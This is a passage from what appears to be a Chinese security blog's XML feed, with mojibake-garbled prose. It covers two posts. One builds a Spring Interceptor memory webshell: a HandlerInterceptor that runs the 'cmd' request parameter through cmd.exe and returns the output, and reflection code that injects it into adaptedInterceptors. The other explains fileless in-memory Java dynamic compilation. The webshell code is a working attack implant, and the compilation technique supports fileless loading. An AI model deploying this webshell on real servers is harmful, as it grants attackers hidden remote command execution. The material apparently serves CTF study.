alt="image-20260115010242888"></p><p><code>adaptedInterceptors</code>æœ¬è´¨æ˜¯ä¸€ä¸ªListï¼Œæ˜¯<code>AbstractHandlerMapping</code>ç±»ä¸­çš„å­—æ®µï¼Œè¯¥çˆ¶ç±»çš„ä¸€ä¸ªå­ç±»<code>RequestMappingInfoHandlerMapping</code>çš„å­ç±»<code>RequestMappingHandlerMapping</code>ï¼Œè¯¥ç±»çš„ä¸€ä¸ªå®ä¾‹å¯¹è±¡æ­£å¥½å°±æ˜¯<code>webApplicationContex</code>çš„ä¸€ä¸ªå­—æ®µï¼Œå¯ä»¥å€ŸåŠ©ä¹‹å‰Controllerå†…å­˜é©¬çš„æ–¹æ³•è·å–<code>RequestMappingHandlerMapping</code>ï¼Œè¿›è€Œè·å–<code>adaptedInterceptors</code></p><br/><h2 id="Interceptorå†…å­˜é©¬æ„å»º"><a href="#Interceptorå†…å­˜é©¬æ„å»º" class="headerlink" title="Interceptorå†…å­˜é©¬æ„å»º"></a>Interceptorå†…å­˜é©¬æ„å»º</h2><p>ç¼–å†™ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„æ¶æ„æ‹¦æˆªå™¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest httprequest, <span class="meta">@NonNull</span> HttpServletResponse response, <span class="meta">@NonNull</span> Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">ServletRequestAttributes</span> <span class="variable">attributes</span> <span class="operator">=</span> (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> attributes.getRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                String output;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), <span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        result.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    output = result.toString();</span><br><span class="line">                    response.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                    response.getWriter().print(output);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç¼–å†™è§¦å‘é€»è¾‘ï¼Œè·å–webä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œ<code>adaptedInterceptors</code>å¹¶é€šè¿‡åå°„è·å–<code>adaptedInterceptors</code>ï¼Œå°†æ¶æ„æ‹¦æˆªå™¨æ³¨å…¥è¯¥å­—æ®µ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">webApplicationContext</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.getRequestAttributes().getAttribute(DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE, <span class="number">0</span>);</span><br><span class="line"><span class="type">RequestMappingHandlerMapping</span> <span class="variable">handlerMapping</span> <span class="operator">=</span> webApplicationContext.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"><span class="type">Field</span> <span class="variable">adaptedInterceptors</span> <span class="operator">=</span> AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">adaptedInterceptors.setAccessible(<span class="literal">true</span>);</span><br><span class="line">List&lt;HandlerInterceptor&gt; list = (List&lt;HandlerInterceptor&gt;) adaptedInterceptors.get(handlerMapping);</span><br><span class="line">list.add(<span class="keyword">new</span> <span class="title class_">IndexInterceptor</span>());</span><br></pre></td></tr></table></figure><p>å®Œæ•´é€»è¾‘</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;injectInterceptor&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">injectInterceptor</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">webApplicationContext</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.getRequestAttributes().getAttribute(DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE, <span class="number">0</span>);</span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">handlerMapping</span> <span class="operator">=</span> webApplicationContext.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">adaptedInterceptors</span> <span class="operator">=</span> AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">        adaptedInterceptors.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        List&lt;HandlerInterceptor&gt; list = (List&lt;HandlerInterceptor&gt;) adaptedInterceptors.get(handlerMapping);</span><br><span class="line">        list.add(<span class="keyword">new</span> <span class="title class_">IndexInterceptor</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;injected&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest httprequest, <span class="meta">@NonNull</span> HttpServletResponse response, <span class="meta">@NonNull</span> Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">ServletRequestAttributes</span> <span class="variable">attributes</span> <span class="operator">=</span> (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> attributes.getRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                String output;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), <span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        result.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    output = result.toString();</span><br><span class="line">                    response.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                    response.getWriter().print(output);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br/>]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaåŠ¨æ€ç±»ç¼–è¯‘ç®€æ</title>
      <link href="/2026/01/12/Java%E5%8A%A8%E6%80%81%E7%B1%BB%E7%BC%96%E8%AF%91%E7%AE%80%E6%9E%90/"/>
      <url>/2026/01/12/Java%E5%8A%A8%E6%80%81%E7%B1%BB%E7%BC%96%E8%AF%91%E7%AE%80%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaåŠ¨æ€ç±»ç¼–è¯‘ç®€æ"><a href="#JavaåŠ¨æ€ç±»ç¼–è¯‘ç®€æ" class="headerlink" title="JavaåŠ¨æ€ç±»ç¼–è¯‘ç®€æ"></a>JavaåŠ¨æ€ç±»ç¼–è¯‘ç®€æ</h1><p>å€ŸåŠ©åŠ¨æ€ç¼–è¯‘æœºåˆ¶å¯ä»¥åœ¨ç¨‹åºè¿è¡Œæ—¶ç¼–è¯‘javaæºä»£ç æ–‡ä»¶å¹¶å°†å…¶ç¼–è¯‘ä¸ºclassæ–‡ä»¶åŠ å…¥è¿è¡Œé€»è¾‘</p><br/><h2 id="ä¸€èˆ¬çš„åŠ¨æ€ç¼–è¯‘"><a href="#ä¸€èˆ¬çš„åŠ¨æ€ç¼–è¯‘" class="headerlink" title="ä¸€èˆ¬çš„åŠ¨æ€ç¼–è¯‘"></a>ä¸€èˆ¬çš„åŠ¨æ€ç¼–è¯‘</h2><p>åŸºæœ¬çš„åŠ¨æ€ç¼–è¯‘æ— éæ˜¯åœ¨ç¨‹åºå·¥ä½œç›®å½•ä¸‹æ–°å»º.javaæºä»£ç æ–‡ä»¶ï¼Œå†™å…¥å®šä¹‰çš„ç±»ï¼Œå†äº¤ç»™ç¼–è¯‘å™¨è¿›è¡Œç¼–è¯‘ï¼Œæœ€åæ‹¿åˆ°ç¼–è¯‘çš„.classzå­—èŠ‚ç æ–‡ä»¶è¿›è¡Œç±»åŠ è½½ã€å®ä¾‹åŒ–ï¼Œè¿™é‡Œæ¼”ç¤ºåœ¨æ–‡ä»¶è½åœ°çš„æƒ…å†µä¸‹è¿›è¡ŒåŠ¨æ€ç¼–è¯‘</p><p>å‰æœŸå·¥ä½œï¼Œæˆ‘ä»¬éœ€è¦è·å–ç¨‹åºçš„å·¥ä½œç›®å½•å¹¶åœ¨ç›¸åŒç›®å½•å†™å…¥.javaæ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">classPath</span> <span class="operator">=</span> CompileTest.class.getResource(<span class="string">&quot;/&quot;</span>).getPath();</span><br><span class="line"><span class="comment">//Windowsç¯å¢ƒä¸‹éœ€åˆ å»è·¯å¾„å¼€å¤´çš„&quot;/&quot;</span></span><br><span class="line">classPath = classPath.substring(<span class="number">1</span>);</span><br><span class="line"><span class="type">FileWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(classPath+<span class="string">&quot;TransformerTest.java&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">sourceCode</span> <span class="operator">=</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">import org.apache.commons.collections.Transformer;</span></span><br><span class="line"><span class="string">import org.apache.commons.collections.functors.ConstantTransformer;</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">public class TransformerTest implements CompileTest &#123;</span></span><br><span class="line"><span class="string">public void test() &#123;</span></span><br><span class="line"><span class="string">Transformer[]  transformers = new Transformer[]&#123;new ConstantTransformer(null)&#125;;</span></span><br><span class="line"><span class="string">ConstantTransformer constantTransformer = new ConstantTransformer(transformers);</span></span><br><span class="line"><span class="string">System.out.println(constantTransformer.transform(&quot;hello&quot;).toString());</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;&quot;&quot;&quot;</span>;</span><br><span class="line">writer.write(sourceCode);</span><br><span class="line">writer.close();</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œè·å–ç¼–è¯‘å™¨ï¼Œç¼–è¯‘å™¨å¯ä»¥é€šè¿‡<code>ToolProvider</code>ç±»ä¸­çš„é™æ€æ–¹æ³•<code>getSystemJavaCompiler()</code>è·å–ï¼Œæ­¤å¤–è¿˜éœ€è¦ä»ç¼–è¯‘å™¨ä¸­è·å–<code>StandardJavaFileManager</code>å®ä¾‹ï¼Œè¯¥å®ä¾‹ç”¨äºå°†ç‰©ç†æ–‡ä»¶ç³»ç»Ÿè½¬åŒ–ä¸º Java ç¼–è¯‘å™¨å¯ä»¥ç†è§£çš„å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">JavaCompiler</span> <span class="variable">compiler</span> <span class="operator">=</span> ToolProvider.getSystemJavaCompiler();</span><br><span class="line"><span class="type">StandardJavaFileManager</span> <span class="variable">manager</span> <span class="operator">=</span> compiler.getStandardFileManager(<span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œæ„å»ºç¼–è¯‘ä»»åŠ¡ï¼Œè°ƒç”¨ä»»åŠ¡ç±»çš„<code>call()</code>æ–¹æ³•è¿›è¡Œç¼–è¯‘</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JavaCompiler.<span class="type">CompilationTask</span> <span class="variable">task</span> <span class="operator">=</span> compiler.getTask(<span class="literal">null</span>, manager, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, files);</span><br><span class="line">task.call();</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œä»ç¼–è¯‘å¾—åˆ°çš„classå­—èŠ‚ç æ–‡ä»¶è·å–ç±»åŠ è½½å™¨ï¼Œè¿™é‡Œä½¿ç”¨<code>URLClassLoader</code>ç±»ï¼Œä¹‹åå°±å¯ä»¥ä½¿ç”¨ç±»åŠ è½½å™¨å®ä¾‹åŒ–ç±»ï¼Œå¹¶è°ƒç”¨æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;file:///&quot;</span>+classPath)&#125;);</span><br><span class="line"><span class="type">CompileTest</span> <span class="variable">transformerTest</span> <span class="operator">=</span> (CompileTest) classLoader.loadClass(<span class="string">&quot;TransformerTest&quot;</span>).newInstance();</span><br><span class="line">transformerTest.test();</span><br></pre></td></tr></table></figure><p>æˆåŠŸç¼–è¯‘å¹¶è°ƒç”¨äº†æ–¹æ³•</p><p><img src="/img/post/image-20260112191928307.png" alt="image-20260112191928307"></p><br/><h2 id="æ— æ–‡ä»¶è½åœ°çš„åŠ¨æ€ç¼–è¯‘"><a href="#æ— æ–‡ä»¶è½åœ°çš„åŠ¨æ€ç¼–è¯‘" class="headerlink" title="æ— æ–‡ä»¶è½åœ°çš„åŠ¨æ€ç¼–è¯‘"></a>æ— æ–‡ä»¶è½åœ°çš„åŠ¨æ€ç¼–è¯‘</h2><p>æ˜¯å¦æœ‰å¯èƒ½è®©ä¸€åˆ‡è¿‡ç¨‹éƒ½åœ¨å†…å­˜ä¸­å‘ç”Ÿè€Œä¸äº§ç”Ÿå…·ä½“æ–‡ä»¶å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œåœ¨è°ƒç”¨<code>call()</code>æ–¹æ³•æ‰§è¡Œç¼–è¯‘ä»»åŠ¡æ—¶ä¹Ÿæ˜¯éœ€è¦ç”¨åˆ°æºä»£ç å’Œå­—èŠ‚ç çš„ï¼Œæ¥ä¸‹æ¥å¯ä»¥å°è¯•å»æ”¹å†™ç¼–è¯‘å™¨è·å–ä»¥ä¸Šä¸¤ä¸ªæ–‡ä»¶çš„é€»è¾‘</p><p>å‰é¢æåˆ°<code>StandardJavaFileManager</code>å®ä¾‹ç”¨äºå°†ç‰©ç†æ–‡ä»¶ç³»ç»Ÿè½¬åŒ–ä¸º Java ç¼–è¯‘å™¨å¯ä»¥ç†è§£çš„å¯¹è±¡ï¼Œæˆ‘ä»¬å¯¹è¯¥å®ä¾‹è°ƒç”¨äº†<code>getJavaFileObjects()</code>æ–¹æ³•è·å¾—äº†ä¸€ä¸ªè¿­ä»£å™¨ï¼Œè¯¥è¿­ä»£å™¨å†…éƒ¨æœ‰ä¸€ä¸ª<code>SimpleFileObject</code>å®ä¾‹ï¼Œå†…éƒ¨ä¸»è¦æ˜¯æŒ‡å‘javaæºä»£ç æ–‡ä»¶çš„urlè·¯å¾„</p><p><img src="/img/post/image-20260112202039305.png" alt="image-20260112202039305"></p><p>å…¶å®<code>SimpleFileObject</code>è¿™ä¸ªç±»ç»™æˆ‘ä»¬é¢„ç•™äº†ä¸€ä¸ªç›´æ¥è·å–æºä»£ç çš„æ–¹æ³•<code>getCharContent()</code>ï¼Œä¸è¿‡è¯¥æ–¹æ³•è¢«è®¾ç½®ä¸ºæŠ›å‡ºå¼‚å¸¸ã€‚å½“åŠ¨æ€ç¼–è¯‘å¼€å§‹æ—¶ï¼Œç¨‹åºä¼šä¼˜å…ˆå°è¯•è¯¥æ–¹æ³•ï¼Œè‹¥æ•è·åˆ°å¼‚å¸¸æ‰ä¼šå»è¿›è¡Œurlè·å–</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> CharSequence <span class="title function_">getCharContent</span><span class="params">(<span class="type">boolean</span> ignoreEncodingErrors)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•å¦‚ä½•é‡å†™ï¼Ÿå…¶å®åªéœ€è¦è¿”å›å­—ç¬¦ä¸²å³å¯ï¼Œä»<code>SimpleFileObject</code>ä¸‹çš„ä¸€ä¸ªé»˜è®¤å­ç±»<code>SourceMemoryJavaFileObject</code>é‡å†™çš„<code>getCharContent()</code>ä¹Ÿå¯ä»¥çœ‹å‡º</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SourceMemoryJavaFileObject</span> <span class="keyword">extends</span> <span class="title class_">MemoryJavaFileObject</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String src;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Object origin;</span><br><span class="line"></span><br><span class="line">        SourceMemoryJavaFileObject(Object origin, String className, String code) &#123;</span><br><span class="line">            <span class="built_in">super</span>(className, JavaFileObject.Kind.SOURCE);</span><br><span class="line">            <span class="built_in">this</span>.origin = origin;</span><br><span class="line">            <span class="built_in">this</span>.src = code;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getOrigin</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> origin;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> CharSequence <span class="title function_">getCharContent</span><span class="params">(<span class="type">boolean</span> ignoreEncodingErrors)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> src;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬ç›´æ¥å†™ä¸€ä¸ªç±»ç»§æ‰¿è‡ª<code>SimpleJavaFileObject</code>ä½¿å…¶<code>getCharContent()</code>è¿”å›æºä»£ç å³å¯</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SourceJavaFileObject</span> <span class="keyword">extends</span> <span class="title class_">SimpleJavaFileObject</span> &#123;</span><br><span class="line">        String sourceCode;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">SourceJavaFileObject</span><span class="params">(String name, String sourceCode)</span> <span class="keyword">throws</span> URISyntaxException &#123;</span><br><span class="line">            <span class="built_in">super</span>(URI.create(<span class="string">&quot;string:///&quot;</span> + name.replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;/&#x27;</span>) + Kind.SOURCE.extension), Kind.SOURCE);</span><br><span class="line">            <span class="built_in">this</span>.sourceCode = sourceCode;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> CharSequence <span class="title function_">getCharContent</span><span class="params">(<span class="type">boolean</span> ignoreEncoding)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> sourceCode;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åœ¨ç¼–è¯‘ä»»åŠ¡å®Œæˆåï¼Œ<code>call()</code>æ–¹æ³•ä¼šæœŸæœ›ä¸€ä¸ªå­—èŠ‚è¾“å‡ºæµç”¨äºæ¥æ”¶ç¼–è¯‘å®Œæˆçš„å­—èŠ‚æ•°ç»„ï¼Œåœ¨å‰é¢çš„ä¾‹å­ä¸­ï¼Œè¯¥å­—èŠ‚è¾“å‡ºæµæŒ‡å‘æˆ‘ä»¬ä¸€å¼€å§‹æŒ‡å®šçš„æ–‡ä»¶åœ°å€ï¼Œè€Œç°åœ¨éœ€è¦ç›´æ¥è·å–è¾“å‡ºæµï¼Œæˆ‘ä»¬å¯ä»¥é‡å†™<code>openOutputStream()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ClassJavaFileObject</span> <span class="keyword">extends</span> <span class="title class_">SimpleJavaFileObject</span> &#123;</span><br><span class="line">        <span class="keyword">static</span> ByteArrayOutputStream outputStream;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ClassJavaFileObject</span><span class="params">(String className, Kind kind)</span> <span class="keyword">throws</span> URISyntaxException &#123;</span><br><span class="line">            <span class="built_in">super</span>(URI.create(<span class="string">&quot;string:///&quot;</span> + className.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + kind.extension), kind);</span><br><span class="line">            outputStream = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> OutputStream <span class="title function_">openOutputStream</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> outputStream;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getClassBytes() &#123;</span><br><span class="line">            <span class="keyword">return</span> outputStream.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œè¿˜éœ€è¦é‡å†™<code>StandardJavaFileManager</code>ï¼Œè¯¥ç±»ä¸ä»…å¸®åŠ©å°†urlèµ„æºè·¯å¾„è½¬æ¢ä¸ºæŠ½è±¡å¯¹è±¡ï¼Œè¿˜å†³å®šäº†ç¼–è¯‘åå­—èŠ‚ç å¯¼å‡ºçš„æ“ä½œï¼Œè‹¥ä¸è¿›è¡Œé‡å†™åˆ™è¯¥å¯¹è±¡ä»ä¼šå°è¯•å°†å­—èŠ‚ç æ–‡ä»¶å†™å…¥æ–‡ä»¶ã€‚æˆ‘ä»¬ä¸»è¦é‡å†™<code>getJavaFileForOutput()</code>æ–¹æ³•ç”¨äºå‘é€å‰é¢æ„é€ çš„<code>ClassJavaFileObjec</code>tå’Œ<code>getClassLoader()</code>æ–¹æ³•ç”¨äºè¿”å›ä¸€ä¸ªè¾“å‡ºå­—èŠ‚æ•°ç»„å†³å®šçš„ç±»åŠ è½½å™¨</p><p>ä¸¤æ–¹æ³•åœ¨<code>ForwardingJavaFileManager</code>ç±»å†…å®šä¹‰ï¼Œæˆ‘ä»¬ç»§æ‰¿å®ƒå³å¯ï¼Œå› ä¸ºè¯¥ç±»å®ç°äº†<code>JavaFileManager</code>æ¥å£ï¼Œ<code>getTask()</code>æ–¹æ³•çš„å‚æ•°åˆ—è¡¨åŸæœ¬å°±æ˜¯æ¥æ”¶è¯¥æ¥å£çš„å®ç°ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">JavaFileManager</span> <span class="keyword">extends</span> <span class="title class_">ForwardingJavaFileManager</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">JavaFileManager</span><span class="params">(StandardJavaFileManager standardFileManager)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(standardFileManager);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> JavaFileObject <span class="title function_">getJavaFileForOutput</span><span class="params">(Location location, String className, JavaFileObject.Kind kind, FileObject sibling)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ClassJavaFileObject</span>(className, kind);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ClassLoader <span class="title function_">getClassLoader</span><span class="params">(Location location)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name)  &#123;</span><br><span class="line">                    <span class="type">byte</span>[] classBytes = ClassJavaFileObject.getClassBytes();</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(name, classBytes, <span class="number">0</span>, classBytes.length);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å®Œæ•´çš„å†…å­˜å†…åŠ¨æ€ç¼–è¯‘è¿‡ç¨‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CompileTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> URISyntaxException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">sourceCode</span> <span class="operator">=</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                  import org.apache.commons.collections.Transformer;</span></span><br><span class="line"><span class="string">                  import org.apache.commons.collections.functors.ConstantTransformer;</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">                  public class TransformerTest implements CompileTest &#123;</span></span><br><span class="line"><span class="string">                      public void test() &#123;</span></span><br><span class="line"><span class="string">                          Transformer[]  transformers = new Transformer[]&#123;new ConstantTransformer(null)&#125;;</span></span><br><span class="line"><span class="string">                          ConstantTransformer constantTransformer = new ConstantTransformer(transformers);</span></span><br><span class="line"><span class="string">                          